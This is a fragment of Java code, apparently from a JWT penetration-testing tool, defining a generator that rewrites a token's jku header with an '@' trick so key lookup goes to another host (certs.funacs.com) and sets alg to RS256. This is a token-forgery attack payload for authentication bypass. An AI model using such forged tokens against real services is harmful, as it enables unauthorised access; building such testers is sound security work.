...
public class JWTHeaderJKUModifiedByAtmarkGenerator extends Generator {

	@Override
	public String getName() {
		return "Header: jku: @を利用して制御可能な別のドメインに変更";
	}
	...
	public String generate(String inputData) throws Exception {
		...
		String jku = jwt.getHeaderValue("jku");
		jwt.setHeaderValue("alg", "RS256");
		jwt.setHeaderValue("jku", String.format("%s%s", jku != null ? jku : "https://userinfo", "@certs.funacs.com/"));
